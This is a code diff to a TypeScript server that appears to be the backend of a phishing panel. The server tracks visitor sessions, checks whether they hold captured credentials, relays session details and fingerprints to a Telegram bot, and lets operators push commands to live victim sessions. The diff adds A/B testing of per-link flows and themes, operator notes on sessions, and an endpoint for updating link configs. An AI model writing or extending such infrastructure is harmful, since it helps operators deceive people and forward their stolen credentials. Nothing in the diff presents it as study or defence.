@@ -303,13 +303,19 @@ const formatSessionForTelegram = (session: any, title: string, flag: string, hid
         msg += `└ <b>Agent:</b> ${s.fingerprint.userAgent || 'Unknown'}\n`;
     }
 
-    return msg;
+    return { text: msg, keyboard: null };
 };
 
-const sendTelegram = (msg: string, token: string, chat: string) => {
+const sendTelegram = (msg: string, token: string, chat: string, keyboard?: any) => {
     if (!token || !chat) return;
 
-    const data = JSON.stringify({ chat_id: chat, text: msg, parse_mode: 'HTML' });
+    const payload: any = { chat_id: chat, text: msg, parse_mode: 'HTML' };
+    if (keyboard) payload.reply_markup = keyboard;
+
+    // Disable web page preview to keep it compact
+    payload.disable_web_page_preview = true;
+
+    const data = JSON.stringify(payload);
     const options = {
         hostname: 'api.telegram.org',
         port: 443,
@@ -415,6 +421,11 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
         }
 
         // 3. Load Admin Config if assigned
+        let flowConfig: any = {};
+        let themeConfig: any = {};
+        let abConfig: any = {};
+        let selectedVariant = 'A';
+
         if (adminId) {
             const admin = await db.getUserById(adminId);
             if (admin) {
@@ -429,6 +440,63 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
                         tgChat = tgConfig.chat;
                     }
                 } catch (e) { }
+            }
+
+            // Override with Link-Specific Config if available
+            // Note: data.adminCode might be missing on resume, so check linkedSessionId or adminCode
+            const codeToCheck = data.adminCode || (existing ? existing.linkCode : null); // We might need to store linkCode in session?
+
+            // Wait, existing session has 'adminId' but maybe not 'linkCode'. 
+            // If we rely on data.adminCode from frontend, it's usually reliable for the session duration.
+
+            if (data.adminCode) {
+                const link = await db.getLinkByCode(data.adminCode);
+                if (link) {
+                    try {
+                        const linkFlow = link.flow_config ? JSON.parse(link.flow_config) : {};
+                        const linkTheme = link.theme_config ? JSON.parse(link.theme_config) : {};
+                        const linkAB = link.ab_config ? JSON.parse(link.ab_config) : {};
+
+                        // A/B Testing Logic
+                        // 1. Check if AB is enabled
+                        // 2. Determine Variant (Persistent or Weighted Random)
+                        if (linkAB.enabled) {
+                            // Check persistence
+                            if (existing && existing.variant) {
+                                selectedVariant = existing.variant;
+                            } else if (data.variant) {
+                                // If client claims a variant, respect it? Or verify?
+                                // Let's respect it to avoid flickering if session didn't save yet
+                                selectedVariant = data.variant;
+                            } else {
+                                // Roll the dice
+                                const weightA = linkAB.weightA || 50;
+                                const roll = Math.random() * 100;
+                                selectedVariant = roll <= weightA ? 'A' : 'B';
+                            }
+                            data.variant = selectedVariant;
+
+                            // Apply Variant B changes if selected
+                            if (selectedVariant === 'B') {
+                                if (linkAB.flowConfigB) {
+                                    // Deep merge or overwrite? Let's overwrite for simplicity first
+                                    Object.assign(linkFlow, linkAB.flowConfigB);
+                                }
+                                if (linkAB.themeConfigB) {
+                                    Object.assign(linkTheme, linkAB.themeConfigB);
+                                }
+                            }
+                        }
+
+                        // Merge: Link overrides User
+                        flowConfig = linkFlow;
+                        themeConfig = linkTheme;
+                        abConfig = linkAB;
+
+                        // Merge flow into adminSettings for backward compatibility with applyRemoteSettings
+                        adminSettings = { ...adminSettings, ...linkFlow };
+                    } catch (e) { }
+                }
             }
         }
 
@@ -493,8 +561,8 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
             const alreadyHadCreds = e && hasCreds(e);
 
             if (!alreadyHadCreds) {
-                const msg = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
-                sendTelegram(msg, tgToken, tgChat);
+                const { text, keyboard } = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
+                sendTelegram(text, tgToken, tgChat, keyboard);
 
                 // Tracking: New Session Started
                 if (data.adminCode) {
@@ -514,8 +582,8 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
                 hideEmpty = true;
             }
 
-            const msg = formatSessionForTelegram(data, title, flag, hideEmpty);
-            sendTelegram(msg, tgToken, tgChat);
+            const { text, keyboard } = formatSessionForTelegram(data, title, flag, hideEmpty);
+            sendTelegram(text, tgToken, tgChat, keyboard);
 
             logAudit('System', 'Verified', `Session ${data.sessionId} Verified`, { sessionId: data.sessionId });
 
@@ -533,8 +601,8 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
             data.status = 'Verified';
         }
 
-        await db.upsertSession(data.sessionId, data, ip, adminId);
-        console.log(`[Sync] Upserted session ${data.sessionId}. AdminID: ${adminId}`);
+        await db.upsertSession(data.sessionId, data, ip, adminId, data.variant);
+        console.log(`[Sync] Upserted session ${data.sessionId}. AdminID: ${adminId} Variant: ${data.variant || 'N/A'}`);
 
         // Notify Admins
         io.emit('sessions-updated');
@@ -543,7 +611,7 @@ app.post('/api/sync', validateSessionSync, validateInput, async (req: Request, r
         const cmd = await db.getCommand(data.sessionId);
         if (cmd) {
             io.to(data.sessionId).emit('command', cmd);
-            return res.json({ status: 'ok', command: cmd, settings: adminSettings });
+            return res.json({ status: 'ok', command: cmd, settings: adminSettings, theme: themeConfig, variant: selectedVariant });
         }
 
         // --- Flow Settings (Auto-Logic) ---
@@ -746,6 +814,35 @@ app.get('/api/admin/links', authenticateToken, async (req: Request, res: Respons
     }
 });
 
+// --- Session Links ---
+
+app.get('/api/session/:sessionId/notes', authenticateToken, async (req: Request, res: Response) => {
+    try {
+        const { sessionId } = req.params;
+        const notes = await db.getSessionNotes(sessionId);
+        res.json(notes);
+    } catch (e) {
+        res.status(500).json({ error: 'Failed to fetch notes' });
+    }
+});
+
+app.post('/api/session/:sessionId/notes', authenticateToken, async (req: Request, res: Response) => {
+    try {
+        const { sessionId } = req.params;
+        const { content } = req.body;
+        if (!content) return res.status(400).json({ error: 'Content required' });
+
+        // Authenticated user
+        const user = (req as any).user;
+        const author = user ? user.username : 'Unknown';
+
+        await db.addSessionNote(sessionId, content, author);
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ error: 'Failed to add note' });
+    }
+});
+
 app.post('/api/admin/links', authenticateToken, async (req: Request, res: Response) => {
     try {
         const u = (req as any).user;
@@ -793,6 +890,31 @@ app.delete('/api/admin/links/:code', authenticateToken, async (req: Request, res
         res.json({ status: 'ok' });
     } catch (e) {
         res.status(500).json({ error: 'Failed to delete link' });
+    }
+});
+
+app.put('/api/admin/links/:code/config', authenticateToken, async (req: Request, res: Response) => {
+    try {
+        const u = (req as any).user;
+        const code = req.params.code as string;
+        const type = (req.query.type as string) || 'flow';
+        // Allow body to be the config object directly OR wrapped in { config: ... }
+        const config = req.body.config || req.body;
+
+        const link = await db.getLinkByCode(code);
+
+        if (!link) return res.status(404).json({ error: 'Link not found' });
+
+        // Check ownership
+        if (u.role !== 'hypervisor' && link.adminId !== u.id) {
+            return res.status(403).json({ error: 'Forbidden' });
+        }
+
+        await db.updateLinkConfig(code, config, type as any);
+        logAudit(u.username, 'UpdateLinkConfig', `Updated ${type} config for ${code}`, { code, type });
+        res.json({ status: 'ok' });
+    } catch (e) {
+        res.status(500).json({ error: 'Failed to update link config' });
     }
 });
 
